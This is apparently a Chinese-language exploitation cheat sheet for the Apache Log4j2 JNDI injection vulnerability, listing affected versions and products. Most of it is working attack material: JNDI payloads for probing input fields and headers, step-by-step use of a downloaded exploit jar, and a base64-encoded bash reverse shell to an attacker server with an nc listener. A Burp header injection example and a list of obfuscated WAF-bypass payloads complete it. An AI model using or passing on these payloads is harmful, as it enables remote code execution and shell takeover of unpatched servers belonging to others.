# apache log4j2

---

- 漏洞类别：命令执行

- 漏洞编号：xxxx

- 时间：2021.12.10

- 影响版本：Apache Log4j 2.x<=2.14.1  Apache log4j-2.15.0-rc2以下 (rc1 补了ldap，rc2补了rmi)

  ```
  Apache Struts2、
  Apache Solr、
  Apache Druid、
  Apache Flink
  Spring-Boot-strater-log4j2ElasticSearch
  Spring-Boot
  Flume
  Dubbo
  Redis
  Logstash
  Kafka
  vmvare 
  Struts
  Tomcat
  Druid
  ElasticSearch
  Dubbo
  RedHat
  Jenkins
  Citrix
  等均受影响
  log4j-2是Java日志框架，以上框架均使用了改日志记录框架
  通过jndi注入借助ldap服务来执行恶意payload
  ```

- 利用教程

    ```
    https://github.com/welk1n/JNDI-Injection-Exploit
    https://www.cnblogs.com/bflw/p/15687995.html
    ```

- 探测 （在输入框或者header参数中输入以下payload即可）

    ```
    ${jndi:ldap://xxx.com/exp}
    ${jndi:rmi://xxx.com/exp}
    ```
    
- 探测工具
  
  ```
  http://www.dnslog.cn/
  http://ceye.io/
  https://log.xn--9tr.com/
  /burp/burp collaborator client/
  ```
  
- 具体复现

  ```
  服务器：
  # jdni注入利用下载
  	https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
  # jdni 注入使用
  	java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "命令" -A "服务器地址"
  # 反弹shell 需要将命令执行进行base64编码 （bash -i >& /dev/tcp/IP/端口 0>&1）
  	java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,命令执行base64}|{base64,-d}|{bash,-i}" -A "服务器IP"
  	例：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "192.168.1.1"
      PS：
          每次重新运行链接都会变：ldap://服务器IP:端口/exp
          对照自己安装的java版本选择payload （java -version）
          如果对应java版本的payload不行，可以试试其他payload
  
  # 等待反弹
   nc -lvp 7777
   
   
   burp拦包：（以header的accept存在漏洞为例：）
  	Accept:${jndi:ldap://服务器IP:端口/exp};application/json;
   PS：
   	发包会卡住代表在运行，在等待反弹的nc窗口进行命令操作
  ```
  
- bypass waf

    ```
    ${jndi:ldap://127.0.0.1:1389/ badClassName}
    ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
    ${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
    ${jndi:rmi://adsasd.asdasd.asdasd}
    ${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
    ${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
    ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
    ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
    ```

    